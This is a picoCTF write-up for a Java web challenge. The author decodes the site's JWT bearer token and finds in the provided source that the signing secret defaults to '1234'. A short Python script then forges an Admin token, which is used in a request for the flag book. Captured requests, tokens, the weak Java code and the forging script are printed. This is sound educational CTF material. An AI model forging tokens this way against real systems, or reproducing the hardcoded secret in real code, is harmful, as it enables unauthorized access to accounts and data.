# Challenge: [Java Code Analysis!?!](https://play.picoctf.org/practice/challenge/355)
100 Points
# Description 
BookShelf Pico, my premium online book-reading service.

I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!
# Solution
This challenge provided a website that allow me to read some online books, actually I was able to read the first one, the others required higher privileges. 

<img src="./media/235952.png" />

Obviously, it said that flag was hidden in the third book which only admin can see.

<img src="./media/000206.png" />

Before analyzing the source code, I did check the network request and response to understand what I should look for in the source code.

I noticed that I was bound with an authorizaton value which help the website identify who was I 

```txt
GET /base/books/pdf/3 HTTP/1.1
Host: saturn.picoctf.net:64650
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc2NzQ1OTUyNiwiaWF0IjoxNzY2ODU0NzI2LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.fe7aiP1vK1Hb22H4rvBH5n3LOzIv2dWZW3HXmg_j36c
Accept: */*
Referer: http://saturn.picoctf.net:64650/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

The string in the field name `authorization` had the format of JWT, I sent it to Decoder tab then to decode as Base64.

<img src="./media/000421.png"/>

So I can try modifying the content of decoded JSON to tamper the admin JWT and read flag.

Alright, so I was clear a part of the exploitation process, the remaining problem was the secret key to make the signature for JWT.

Therefore, I went through the given source code to figure out. I found some code blocks which mention about secret key for JWT in the file `SecretGenerator.java`

```java
 private String generateRandomString(int len) {
        // not so random
        return "1234";
    }

    String getServerSecret() {
        try {
            String secret = new String(FileOperation.readFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME), Charset.defaultCharset());
            logger.info("Server secret successfully read from the filesystem. Using the same for this runtime.");
            return secret;
        }catch (IOException e){
            logger.info(SERVER_SECRET_FILENAME+" file doesn't exists or something went wrong in reading that file. Generating a new secret for the server.");
            String newSecret = generateRandomString(32);
            try {
                FileOperation.writeFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME, newSecret.getBytes());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            logger.info("Newly generated secret is now written to the filesystem for persistence.");
            return newSecret;
        }
    }
```

Basically, the source code read the value contained in `SERVER_SECRET_FILENAME` as secret key, but if `SERVER_SECRET_FILENAME` was not existing, the source would gentarate that file and write the value **1234** into. For this concept, I understood that the secret key was **1234** by the way.

I dug deeper to find the reference for parameters to tamper admin authorization, and in `data.sql` contained helpful information for me.

```sql
INSERT INTO roles VALUES ('Free', 1);
INSERT INTO roles VALUES ('Basic', 2);
INSERT INTO roles VALUES ('Premium', 3);
INSERT INTO roles VALUES ('Admin', 4);
```

Next, I encoded all information I gathered as Base64 into JWT, I designed a script to help (honestly I didn't why it accpeted for case userID = 2, intially I thought it should be 4)

```py
mport jwt
import datetime

secret = "1234"

payload = {
    "role": "Admin",
    "userId": 2,
    "email": "admin",
    "iss": "bookshelf",
    "iat": datetime.datetime.utcnow(),
    "exp": datetime.datetime.utcnow() + datetime.timedelta(days=7)
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

Once running the script to obtain the valid JWT, I excute request GET to the route `/base/books/pdf/5` to read the flag.

```
GET /base/books/pdf/5 HTTP/1.1
Host: saturn.picoctf.net:64650
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiQWRtaW4iLCJ1c2VySWQiOjIsImVtYWlsIjoiYWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJpYXQiOjE3NjY4NTUxMDksImV4cCI6MTc2NzQ1OTkwOX0.FNpGKdLq4uYcKUy99UF-nlB1nglYmAIIhShz9-OaX38
Accept: */*
Referer: http://saturn.picoctf.net:64650/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

Because I tried accessing free book before and observed the route it returned to guess the possible route containing the flag.
